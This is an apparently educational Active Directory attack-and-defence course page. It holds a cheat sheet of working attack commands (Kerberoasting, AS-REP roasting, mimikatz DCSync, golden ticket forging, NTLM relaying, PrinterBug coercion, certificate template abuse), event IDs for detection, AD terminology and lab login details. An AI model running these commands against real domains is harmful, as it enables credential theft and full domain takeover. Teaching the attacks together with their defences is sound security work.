
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">

<h1 id="windows-attacks-defense">Windows Attacks &amp; Defense</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<h2 id="kerberoasting">Kerberoasting</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.\Rubeus.exe kerberoast /outfile:spn.txt</code></td>
<td>Used to perform the Kerberoast attack and save output to a file.</td>
</tr>
<tr>
<td><code>hashcat -m 13100 -a 0 spn.txt passwords.txt</code></td>
<td>Uses <code>hashcat</code> to crack Keberoastable TGS tickets.</td>
</tr>
<tr>
<td><code>sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot</code></td>
<td>Uses <code>John the Ripper</code> to crack TGS tickets, and outputs to results.pot.</td>
</tr>
</tbody>
</table>
<h2 id="asreproasting">Asreproasting</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.\Rubeus.exe asreproast /outfile:asrep.txt</code></td>
<td>Used to perform the Asreproast attack and save the extracted tickets to a file.</td>
</tr>
<tr>
<td><code>hashcat -m 18200 -a 0 asrep.txt passwords.txt --force</code></td>
<td>Uses <code>hashcat</code> to crack AS-REP hashes that were saved in a file.</td>
</tr>
</tbody>
</table>
<h2 id="gpp-passwords">GPP Passwords</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Import-Module .\Get-GPPPassword.ps1</code></td>
<td>Used to import the <code>Get-GPPPassword.ps1</code> script into the current powershell session.</td>
</tr>
<tr>
<td><code>Get-GPPPassword</code></td>
<td>Cmdlet to automatically parse all XML files in the Policies folder in SYSVOL.</td>
</tr>
<tr>
<td><code>Set-ExecutionPolicy Unrestricted -Scope CurrentUser</code></td>
<td>Used to bypass powershell script execution policy.</td>
</tr>
</tbody>
</table>
<h2 id="credentials-in-shares">Credentials in Shares</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Import-Module .\PowerView.ps1</code></td>
<td>Used to load the <code>PowerView.ps1</code> module into memory</td>
</tr>
<tr>
<td><code>Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess</code></td>
<td>PowerShell cmdlet used to identify shares in a domain</td>
</tr>
<tr>
<td><code>findstr /m /s /i &quot;eagle&quot; *.ps1</code></td>
<td>Forces a search within the current directory + subdirectories for the .ps1 file containing the string &quot;eagle&quot;</td>
</tr>
</tbody>
</table>
<h2 id="credentials-in-object-properties">Credentials in Object Properties</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.\SearchUser.ps1 -Terms pass</code></td>
<td>Script to look for specific terms in the <code>Description</code> and <code>Info</code> fields of an AD object</td>
</tr>
</tbody>
</table>
<h2 id="dcsync">DCSync</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>runas /user:eagle\rocky cmd.exe</code></td>
<td>Start a new instance of <code>cmd.exe</code> as the user <code>eagle\rocky</code>.</td>
</tr>
<tr>
<td><code>mimikatz.exe</code></td>
<td>Tool used to implement the DCsync attack</td>
</tr>
<tr>
<td><code>lsadump::dcsync /domain:eagle.local /user:Administrator</code></td>
<td>Command used in <code>mimikatz</code> to DCSync and dump the <code>Administrator</code> password hash</td>
</tr>
</tbody>
</table>
<h2 id="golden-ticket">Golden Ticket</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>lsadump::dcsync /domain:eagle.local /user:krbtgt</code></td>
<td>Command used in <code>mimikatz</code> to DCSync and dump the <code>krbtgt</code> password hash</td>
</tr>
<tr>
<td><code>Get-DomainSID</code></td>
<td>Cmdlet from <code>PowerView</code> used to obtain the SID value of the domain.</td>
</tr>
<tr>
<td><code>golden /domain:eagle.local /sid:&lt;domain sid&gt; /rc4:&lt;rc4 hash&gt; /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt</code></td>
<td>Command used in <code>mimikatz</code> to forge a golden ticket for the <code>Administrator</code> account and pass the ticket to the current session</td>
</tr>
<tr>
<td><code>klist</code></td>
<td>Command line utility in Windows to display the contents of the Kerberos ticket cache.</td>
</tr>
</tbody>
</table>
<h2 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-NetUser -TrustedToAuth</code></td>
<td>Cmdlet used to enumerate user accounts that are trusted for delegation in the domain</td>
</tr>
<tr>
<td><code>.\Rubeus.exe hash /password:Slavi123</code></td>
<td>Converts the plaintext password <code>Slavi123</code> to its NTLM hash equivalent</td>
</tr>
<tr>
<td><code>.\Rubeus.exe s4u /user:webservice /rc4:&lt;hash&gt; /domain:eagle.local /impersonateuser:Administrator /msdsspn:&quot;http/dc1&quot; /dc:dc1.eagle.local /ptt</code></td>
<td>Using Rubeus to request a ticket for the <code>Administrator</code> account, by way of the <code>webservice</code> user who is trusted for delegation</td>
</tr>
<tr>
<td><code>Enter-PSSession dc1</code></td>
<td>Used to enter a new powershell remote session on the <code>dc1</code> computer</td>
</tr>
</tbody>
</table>
<h2 id="print-spooler-ntlm-relaying">Print Spooler &amp; NTLM Relaying</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support</code></td>
<td>Used to forward any connections to DC2 and attempt to perform DCsync attack</td>
</tr>
<tr>
<td><code>python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123</code></td>
<td>Used to trigger the PrinterBug</td>
</tr>
<tr>
<td><code>RegisterSpoolerRemoteRpcEndPoint</code></td>
<td>Registry key that can be disabled to prevent the PrinterBug</td>
</tr>
</tbody>
</table>
<h2 id="coercing-attacks-unconstrained-delegation">Coercing Attacks &amp; Unconstrained Delegation</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>`Get-NetComputer -Unconstrained \</td>
<td>select samaccountname`</td>
<td>PowerView command used to idenfity systems configred for Unconstrained Delegation.</td>
</tr>
<tr>
<td><code>.\Rubeus.exe monitor /interval:1</code></td>
<td>Used to monitor new logons and extract TGTs.</td>
</tr>
<tr>
<td><code>Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local</code></td>
<td>Used to perform a coercing attack towards DC1, forcing it to connect to WS001.</td>
</tr>
<tr>
<td><code>mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</code></td>
<td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td>
</tr>
</tbody>
</table>
<h2 id="object-acls">Object ACLs</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>setspn -D http/ws001 anni</code></td>
<td>Removing the http/ws001 SPN from the anni user.</td>
</tr>
<tr>
<td><code>setspn -U -s ldap/ws001 anni</code></td>
<td>Setting a new SPN, ldap/ws001, on the anni user.</td>
</tr>
<tr>
<td><code>setspn -S ldap/server02</code> server01</td>
<td>Setting a new SPN, ldap/server02, on the server01 machine.</td>
</tr>
</tbody>
</table>
<h2 id="pki-esc1">PKI - ESC1</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.\Certify.exe find /vulnerable</code></td>
<td>Using the Certify.exe tool to scan for vulnerabilities in PKI infrastructure.</td>
</tr>
<tr>
<td><code>.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator</code></td>
<td>Using the Certify.exe tool to obtain a certifcate from the vulnerable template</td>
</tr>
<tr>
<td><code>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</code></td>
<td>Command to convert a <code>PEM</code> certificate to a <code>PFX</code> certificate.</td>
</tr>
<tr>
<td><code>.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt</code></td>
<td>Using the Rubeus.exe tool to request a TGT for the domain Administrator by way of forged certifcate.</td>
</tr>
<tr>
<td><code>runas /user:eagle\htb-student powershell</code></td>
<td>Start a new instance as powershell as the htb-student user.</td>
</tr>
<tr>
<td><code>New-PSSession PKI</code></td>
<td>Start a new remote powershell session on the <code>PKI</code> machine.</td>
</tr>
<tr>
<td><code>Enter-PSSession PKI</code></td>
<td>Enter a remote powershell session on the <code>PKI</code> machine.</td>
</tr>
<tr>
<td><code>Get-WINEvent -FilterHashtable @{Logname=&#39;Security&#39;; ID=&#39;4887&#39;}</code></td>
<td>Using the Get-WinEvent cmdlet to view windows Event 4887</td>
</tr>
<tr>
<td><code>$events = Get-WinEvent -FilterHashtable @{Logname=&#39;Security&#39;; ID=&#39;4886&#39;}</code></td>
<td>Command used to save the events into an array</td>
</tr>
<tr>
<td>`$events[0] \</td>
<td>Format-List -Property *`</td>
<td>Command to view events within the array. The <code>0</code> can be adjusted to a different number to match the corresponding event</td>
</tr>
</tbody>
</table>
<h2 id="pki-coercing-esc8">PKI &amp; Coercing - ESC8</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs</code></td>
<td>Command to forward incoming connections to the CA. The <code>--adcs</code> switch makes the tool parse and display the certificate if one is received.</td>
</tr>
<tr>
<td><code>python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123</code></td>
<td>Using the PrinterBug to trigger a connection back to the attacker.</td>
</tr>
<tr>
<td><code>xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution</code></td>
<td>Connecting to WS001 from the Kali host using RDP.</td>
</tr>
<tr>
<td><code>.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:&lt;b64 encoded cert&gt;</code></td>
<td>Using Rubeus.exe to ask for a TGT by way of base 64 encoded certificate.</td>
</tr>
<tr>
<td><code>mimikatz.exe &quot;lsadump::dcsync /user:Administrator&quot; exit</code></td>
<td>Using mimikatz.exe to DCsync the <code>administrator</code> user. This is performed once the TGT for DC2 has been passed to the current session.</td>
</tr>
<tr>
<td><code>evil-winrm -i 172.16.18.15 -u htb-student -p &#39;HTB_@cademy_stdnt!&#39;</code></td>
<td>Connecting to PKI from the Kali Host using evil-winrm.</td>
</tr>
</tbody>
</table>
<h2 id="windows-events">Windows Events</h2>
<table><thead><tr><th width="207">Event ID</th><th>Description</th></tr></thead><tbody><tr><td><code>4769</code></td><td>Event generated when a TGS is requested. Can be indicative of Kerberoasting.</td></tr><tr><td><code>4768</code></td><td>Event generated when a TGT is requested. Can be indicative of Asreproasting.</td></tr><tr><td><code>4625</code></td><td>Event generated when an account fails to log on.</td></tr><tr><td><code>4771</code></td><td>Event generated by a Kerberos pre-authentication failure.</td></tr><tr><td><code>4776</code></td><td>Event generated when attempting to validate the credentials of an account.</td></tr><tr><td><code>5136</code></td><td>Event generated when a GPO is modified, if Directory Service Changes auditing is enabled.</td></tr><tr><td><code>4725</code></td><td>Event generated when a user account is disabled.</td></tr><tr><td><code>4624</code></td><td>Event generated when an account successfully logs on to a windows computer. The S4U extension notes the presence of delegation.</td></tr><tr><td><code>4662</code></td><td>Event generated by a possible DCsync attack. If the account name is not a domain controller, it serves as a flag that a user generated the attack.</td></tr><tr><td><code>4738</code></td><td>Event generated when a user account is changed. Any association of this event with a honeypot user should trigger an alert.</td></tr><tr><td><code>4742</code></td><td>Event generated when a computer account is changed.</td></tr><tr><td><code>4886</code></td><td>Event generated when a certificate is requested.</td></tr><tr><td><code>4887</code></td><td>Event generated when a certificate is approved and issued.</td></tr></tbody></table>

<h2 id="introduction-and-terminology">Introduction and Terminology</h2>
<hr>
<h3 id="what-is-active-directory-">What is Active Directory?</h3>
<p><code>Active Directory</code> (<code>AD</code>) is a directory service for Windows enterprise environments that Microsoft officially released in 2000 with Windows Server 2000. Microsoft has been incrementally improving AD with the release of each new server OS version. Based on the protocols x.500 and LDAP that came before it (which are still utilized in some form today), AD is a distributed, hierarchical structure that allows centralized management of an organization&#39;s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functionalities within a Windows enterprise environment. It also allows administrators to manage permissions and access to network resources.</p>
<p>Active Directory is so widespread that it is by a margin the most utilized Identity and Access management (<code>IAM</code>) solution worldwide. For this reason, the vast majority of enterprise applications seamlessly integrate and operate with Active Directory. Active Directory is the most critical service in any enterprise. A compromise of an Active Directory environment means unrestricted access to all its systems and data, violating its <code>CIA</code> (<code>Confidentiality</code>, <code>Integrity</code>, and <code>Availability</code>). Researchers constantly discover and disclose vulnerabilities in AD. Via these vulnerabilities, threat actors can utilize malware known as ransomware to hold an organization&#39;s data hostage for ransom by performing cryptographic operations (<code>encryption</code>) on it, therefore rendering it useless until they either pay a fee to purchase a decryption key (<code>not advised</code>) or obtain the decryption key with the help of IT Security professionals. However, if we think back, an Active Directory compromise means the compromise of all and any applications, systems, and data instead of a single system or service.</p>
<p>Let&#39;s look at publicly disclosed vulnerabilities for the past three years (2020 to 2022). Microsoft has over 3000, and around 9000 since 1999, which signifies an incredible growth of research and vulnerabilities in the past years. The most apparent practice to keep Active Directory secure is ensuring that proper <code>Patch Management</code> is in place, as patch management is currently posing challenges to organizations worldwide. For this module, we will assume that Patch Management is done right (Proper Patch Management is crucial for the ability to withstand a compromise) and focus on other attacks and vulnerabilities we can encounter. We will focus on showcasing attacks that abuse common misconfigurations and Active Directory features, especially ones that are very common/familiar yet incredibly hard to eliminate. Additionally, the protections discussed here aim to arm us for the future, helping us create proper cyber hygiene. If you are thinking <code>Defence in depth</code>, <code>Network segmentation</code>, and the like, then you are on the right track.</p>
<p>If this is your first time learning about Active Directory or hearing these terms, check out the <a href="https://academy.hackthebox.com/module/details/74">Intro to Active Directory</a> module for a more in-depth look at the structure and function of AD, AD objects, etc. And also <a href="https://academy.hackthebox.com/module/details/143">Active Directory - Enumeration and Attacks</a> for strengthening your knowledge and gaining an overview of some common attacks.</p>
<hr>
<h3 id="refresher">Refresher</h3>
<p>To ensure we are familiar with the basic concepts, let&#39;s review a quick refresher of the terms.</p>
<p>A <code>domain</code> is a group of objects that share the same AD database, such as users or devices.</p>
<p>A <code>tree</code> is one or more domains grouped. Think of this as the domains <code>test.local</code>, <code>staging.test.local</code>, and <code>preprod.test.local</code>, which will be in the same tree under <code>test.local</code>. Multiple trees can exist in this notation.</p>
<p>A <code>forest</code> is a group of multiple trees. This is the topmost level, which is composed of all domains.</p>
<p><code>Organizational Units</code> (<code>OU</code>) are Active Directory containers containing user groups, Computers, and other OUs.</p>
<p><code>Trust</code> can be defined as access between resources to gain permission/access to resources in another domain.</p>
<p><code>Domain Controller</code> is (generally) the Admin of the Active Directory used to set up the entire Directory. The role of the Domain Controller is to provide Authentication and Authorization to different services and users. In Active Directory, the Domain Controller has the topmost priority and has the most authority/privileges.</p>
<p><code>Active Directory Data Store</code> contains Database files and processes that store and manages directory information for users, services, and applications. Active Directory Data Store contains the file <code>NTDS.DIT</code>, the most critical file within an AD environment; domain controllers store it in the <code>%SystemRoot%\NTDS</code> folder.</p>
<p>A <code>regular AD user account</code> with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to:</p>
<ul>
<li><code>Domain Computers</code></li>
<li><code>Domain Users</code></li>
<li><code>Domain Group Information</code></li>
<li><code>Default Domain Policy</code></li>
<li><code>Domain Functional Levels</code></li>
<li><code>Password Policy</code></li>
<li><code>Group Policy Objects</code> (GPOs)</li>
<li><code>Kerberos Delegation</code></li>
<li><code>Domain Trusts</code></li>
<li><code>Access Control Lists</code> (ACLs)</li>
</ul>
<p>Although the settings of AD allow this default behavior to be modified/disallowed, its implications can result in a complete breakdown of applications, services, and Active Directory itself.</p>
<p><code>LDAP</code> is a protocol that systems in the network environment use to communicate with Active Directory. Domain Controller(s) run LDAP and constantly listen for requests from the network.</p>
<p><code>Authentication</code> in Windows Environments:</p>
<ul>
<li>Username/Password, stored or transmitted as password hashes (<code>LM</code>, <code>NTLM</code>, <code>NetNTLMv1</code>/<code>NetNTLMv2</code>).</li>
<li><code>Kerberos</code> tickets (Microsoft&#39;s implementation of the Kerberos protocol). Kerberos acts as a trusted third party, working with a domain controller (DC) to authenticate clients trying to access services. The Kerberos authentication workflow revolves around tickets that serve as cryptographic proof of identity that clients exchange between each other, services, and the DC.</li>
<li><code>Authentication over LDAP</code>. Authentication is allowed via the traditional username/password or user or computer certificates.</li>
</ul>
<p><code>Key Distribution Center</code> (<code>KDC</code>): a Kerberos service installed on a DC that creates tickets. Components of the KDC are the authentication server (AS) and the ticket-granting server (TGS).</p>
<p><code>Kerberos Tickets</code> are tokens that serve as proof of identity (created by the KDC):</p>
<ul>
<li><code>TGT</code> is proof that the client submitted valid user information to the KDC.</li>
<li><code>TGS</code> is created for each service the client (with a valid TGT) wants to access.</li>
</ul>
<p><code>KDC key</code> is an encryption key that proves the TGT is valid. AD creates the KDC key from the hashed password of the <code>KRBTGT</code> account, the first account created in an AD domain. Although it is a disabled user, KRBTGT has the vital purpose of storing secrets that are randomly generated keys in the form of password hashes. One may never know what the actual password value represents (even if we try to configure it to a known value, AD will automatically override it to a random one).</p>
<p>Each domain contains the groups <code>Domain admins</code> and <code>Administrators</code>, the most privileged groups in broad access. By default, AD adds members of Domain admins to be Administrators on all Domain joined machines and therefore grants the rights to log on to them. While the &#39;Administrators&#39; group of the domain can only log on to Domain Controllers by default, they can manage any Active Directory object (e.g., all servers and therefore assign themselves the rights to log on to them). The topmost domain in a forest also contains an object, the group <code>Enterprise Admins</code>, which has permissions over all domains in the forest.</p>
<p>Default groups in Active Directory are heavily privileged and carry a hidden risk. For example, consider the group <code>Account Operators</code>. When asking AD admins what the reason is to assign it to users/super users, they will respond that it makes the work of the &#39;Service Desk&#39; easier as then they can reset user passwords. Instead of creating a new group and delegating that specific right to the Organizational Units containing user accounts, they violate the principle of least privilege and endanger all users. Subsequently, this will include an escalation path from Account Operators to Domain Admins, the most common one being through the &#39;MSOL_&#39; user accounts that Azure AD Connect creates upon installation. These accounts are placed in the default &#39;Users&#39; container, where &#39;Account operators&#39; can modify the user objects.</p>
<p>It is essential to highlight that Windows has multiple logon types: &#39; how&#39; users log on to a machine, which can be, for example, interactive while a user is physically present on a device or remotely over RDP. Logon types are essential to know about because they will leave a &#39;trace&#39; behind on the system(s) accessed. This trace is the username and password used. As a rule of thumb, logon types except &#39;Network logon, type 3&#39; leave credentials on the system authenticated and connected to. Microsoft provides a complete list of logon types <a href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">here</a>.</p>
<p>To interact with Active Directory, which lives on Domain Controllers, we must speak its language, LDAP. Any query happens by sending a specifically crafted message in LDAP to a Domain Controller, such as obtaining user information and a group&#39;s membership. Early in its life, Microsoft realized that LDAP is not a &#39;pretty&#39; language, and they released Graphical tools that can present data in a friendly interface and convert &#39;mouse clicks&#39; into LDAP queries. Microsoft developed the <code>Remote Server Administration Tools</code> (RSAT), enabling the ability to interact with Active Directory locally on the Domain Controller or remotely from another computer object. The most popular tools are <code>Active Directory Users and Computers</code> (which allows for accessible viewing/moving/editing/creating objects such as users, groups, and computers) and <code>Group Management Policy</code> (which allows for the creation and modification of Group policies).</p>
<p>Important network ports in any Windows environment include (memorizing them is hugely beneficial):</p>
<ul>
<li>53: <code>DNS</code>.</li>
<li>88: <code>Kerberos</code>.</li>
<li>135: <code>WMI</code>/<code>RPC</code>.</li>
<li>137-139 &amp; 445: <code>SMB</code>.</li>
<li>389 &amp; 636: <code>LDAP</code>.</li>
<li>3389: <code>RDP</code></li>
<li>5985 &amp; 5896: <code>PowerShell Remoting</code> (<code>WinRM</code>)</li>
</ul>
<hr>
<h3 id="real-world-view">Real-world view</h3>
<p>Every organization, which has (attempted) at some point to increase its maturity, has gone through exercises that classify its systems. The classification defines the <code>importance</code> of each system to the business, such as <code>ERP</code>, <code>CRM</code>, and <code>backups</code>. A business relies on this to successfully meet its objectives and is significantly different from one organization to another. In Active Directory, any additional roles, services, and features that get &#39;added&#39; on top of what comes out of the box must be classified. This classification is necessary to ensure that we set the bar for which service, if compromised, poses an escalation risk toward the rest of Active Directory. In this design view, we need to ensure that any service allowing for direct (or indirect) escalation is treated similarly as if it was a Domain Controller/Active Directory. Active Directory is massive, complex, and feature-heavy - potential escalation risks are under every rock. Active Directory will provide services such as DNS, PKI, and Endpoint Configuration Manager in an enterprise organization. If an attacker were to obtain administrative rights to these services, they would indirectly have means to escalate their privileges to those of an Administrator of the <code>entire forest</code>. We will demonstrate this through some attack paths described later in the module.</p>
<p>Active Directory has limitations, however. Unfortunately, these limitations are a &#39;weak&#39; point and expand our attack surface - some born by complexity, others by design, and some due to legacy and backward compatibility. For the sake of completeness, below are three examples of each:</p>
<ol>
<li><code>Complexity</code> - The simplest example is figuring out nested group members. It is easy to get lost when looking into who is a member of a group, a member of another group, and a member of yet another group. While you may think this chain ends eventually, many environments have every &#39;Domain user&#39; indirectly a member of &#39;Domain Admins&#39;.</li>
<li><code>Design</code> - Active Directory allows managing machines remotely via Group Policy Objects (GPOs). AD stores GPOs in a unique network share/folder called <code>SYSVOL</code>, where all domain-joined devices pull settings applied to them. Because it is a network-shared folder, clients access SYSVOL via the SMB protocol and transfer stored information. Thus, for a machine to use new settings, it has to call a Domain Controller and pull settings from SYSVOL - this is a systematic process, which by default occurs every 90 minutes. Every device must have a Domain Controller &#39;in sight&#39; to pull this data from. The downside of this is that the SMB protocol also allows for code execution (a remote command shell, where commands will be executed on the Domain Controller), so as long as we have a set of valid credentials, we can consistently execute code over SMB on the Domain Controllers remotely. This port/protocol is available to all machines toward Domain Controllers. (Additionally, SMB is not well fit (generally Active Directory) for the zero-trust concepts.) If an attacker has a good set of privileged credentials, they can execute code as that account on Domain Controllers over SMB (at least!).</li>
<li><code>Legacy</code> - Windows is made with a primary focus: it works out of the box for most of Microsoft&#39;s customers. Windows is <code>not</code> secure by default. A legacy example is that Windows ships with the broadcasting - DNS-like protocols <code>NetBIOS</code> and <code>LLMNR</code> enabled by default. These protocols are meant to be used if DNS fails. However, they are active even when it does not. However, due to their design, they broadcast user credentials on the wire (usernames, passwords, password hashes), which can effectively provide privileged credentials to anyone listening on the wire by simply being there. This <a href="https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/">blog post</a> demonstrates the abuse of capturing credentials on the wire.</li>
</ol>
<h2 id="overview">Overview</h2>
<hr>
<p>In this module, we will dive deep into several different attacks. The objective for each attack is to:</p>
<ol>
<li>Describe it.</li>
<li>Provide a walkthrough of how we can carry out the attack.</li>
<li>Provide preventive techniques and compensating controls.</li>
<li>Discuss detection capabilities.</li>
<li>Discuss the &#39;honeypot&#39; approach of detecting the attack, if applicable.</li>
</ol>
<p>The following is a complete list of all attacks described in this module:</p>
<ul>
<li><code>Kerberoasting</code></li>
<li><code>AS-REProasting</code></li>
<li><code>GPP Passwords</code></li>
<li><code>Misconfigured GPO Permissions (or GPO-deployed files)</code></li>
<li><code>Credentials in Network Shares</code></li>
<li><code>Credentials in User Attributes</code></li>
<li><code>DCSync</code></li>
<li><code>Kerberos Golden Ticket</code></li>
<li><code>Kerberos Constrained Delegation attack</code></li>
<li><code>Print Spooler &amp; NTLM Relaying</code></li>
<li><code>Coercing attacks &amp; Kerberos Unconstrained Delegation</code></li>
<li><code>Object ACLs</code></li>
<li><code>PKI Misconfigurations</code> - <code>ESC1</code></li>
<li><code>PKI Misconfigurations</code> - <code>ESC8</code> (<code>Coercing</code> + <code>Certificates</code>)</li>
</ul>
<hr>
<h3 id="lab-environment">Lab Environment</h3>
<p>As part of this module, we also provide a playground environment where you can test and follow up with the provided walkthroughs to carry out these attacks yourself. Please note that the purpose of the walkthroughs is to demonstrate the problem and not to describe the attacks in depth. Also, other modules on the platform are already covering these attacks very detailedly.</p>
<p>The attacks will be executed from the provided Windows 10 (WS001) and Kali Linux machines. The assumption is that an attacker has already gained remote code execution (of some sort) on that Windows 10 (WS001) machine. The user, which we assume is compromised, is <code>Bob</code>, a regular user in Active Directory with no special permissions assigned.</p>
<p>The environment consists of the following machines and their corresponding IP addresses:</p>
<ul>
<li><code>DC1</code>: <code>172.16.18.3</code></li>
<li><code>DC2</code>: <code>172.16.18.4</code></li>
<li><code>Server01</code>: <code>172.16.18.10</code></li>
<li><code>PKI</code>: <code>172.16.18.15</code></li>
<li><code>WS001</code>: <code>DHCP or 172.16.18.25</code> (depending on the section)</li>
<li><code>Kali Linux</code>: <code>DHCP or 172.16.18.20</code> (depending on the section)</li>
</ul>
<hr>
<h3 id="connecting-to-the-lab-environment">Connecting to the lab environment</h3>
<p>Most of the hosts mentioned above are vulnerable to several attacks and live in an isolated network that can be accessed via the VPN. While on the VPN, a student can directly access the machines WS001 and/or Kali (depending on the section), which, as already mentioned, will act as initial foothold and attacker devices throughout the scenarios.</p>
<p>Below, you may find guidance (from a Linux host):</p>
<ul>
<li>How to connect to the Windows box WS001</li>
<li>How to connect to the Kali box</li>
<li>How to transfer files between WS001 and your Linux attacking machine</li>
</ul>
<hr>
<h3 id="connect-to-ws001-via-rdp">Connect to WS001 via RDP</h3>
<p>Once connected to the VPN, you may access the Windows machine via RDP. Most Linux flavors come with a client software, &#39;xfreerdp&#39;, which is one option to perform this RDP connection. To access the machine, we will use the user account Bob whose password is &#39;Slavi123&#39;. To perform the connection execute the following command:</p>
<p>Overview</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">u:</span>eagle\\bob <span class="hljs-regexp">/p:Slavi123 /</span><span class="hljs-string">v:</span>TARGET_IP /dynamic-resolution
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/Lab/RDPWindows.png" alt="xfreeRDP"></p>
<p>If the connection is successful, a new window with WS001&#39;s desktop will appear on your screen, as shown below:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/Lab/RDPWindows2.png" alt="xfreeRDP success"></p>
<hr>
<h3 id="connect-to-kali-via-ssh">Connect to Kali via SSH</h3>
<p>Once connected to the VPN, we can access the Kali machine via SSH. The credentials of the machine are the default &#39;kali/kali&#39;. To connect, use the following command:</p>
<p>Overview</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ ssh kali<span class="hljs-meta">@TARGET</span>_IP
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/Lab/SSHKali.png" alt="SSH connection"></p>
<p><code>Note:</code> We have also enabled RDP on the Kali host. For sections with the Kali host as the primary target, it is recommended to connect with RDP. Connection credentials will be provided for each challenge question.</p>
<p>Overview</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">v:</span>TARGET_IP <span class="hljs-regexp">/u:kali /</span><span class="hljs-string">p:</span>kali /dynamic-resolution
</code></pre>
<hr>
<h3 id="moving-files-between-ws001-and-your-linux-attacking-machine">Moving files between WS001 and your Linux attacking machine</h3>
<p>To facilitate easy file transfer between the machines, we have created a shared folder on WS001, which can be accessed via SMB.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/Lab/share1.png" alt="Share Folder"></p>
<p>To access the folder from the Kali machine, you can use the &#39;smbclient&#39; command. Accessing the folder requires authentication, so you will need to provide credentials. The command can be executed with the Administrator account as follows:</p>
<p>Overview</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ smbclient <span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>TARGET_IP<span class="hljs-symbol">\\</span>Share -U eagle/administrator<span class="hljs-variable">%Slavi123</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/Lab/share2.png" alt="Share Folder connection"></p>
<p>Once connected, you can utilize the commands <code>put</code> or <code>get</code> to either upload or download files, respectively.</p>
<h2 id="kerberoasting">Kerberoasting</h2>
<hr>
<h3 id="description">Description</h3>
<p>In Active Directory, a <a href="https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names">Service Principal Name (SPN)</a> is a unique service instance identifier. <code>Kerberos</code> uses SPNs for authentication to associate a service instance with a service logon account, which allows a client application to request that the service authenticate an account even if the client does not have the account name. When a Kerberos <code>TGS</code> service ticket is asked for, it gets encrypted with the service account&#39;s NTLM password hash.</p>
<p><code>Kerberoasting</code> is a post-exploitation attack that attempts to exploit this behavior by obtaining a ticket and performing offline password cracking to <code>open</code> the ticket. If the ticket opens, then the candidate password that opened the ticket is the service account&#39;s password. The success of this attack depends on the strength of the service account&#39;s password. Another factor that has some impact is the encryption algorithm used when the ticket is created, with the likely options being:</p>
<ul>
<li><code>AES</code></li>
<li><code>RC4</code></li>
<li><code>DES</code> (found in environments that are 15+ old years old with legacy apps from the early 2000s, otherwise, this will be disabled)</li>
</ul>
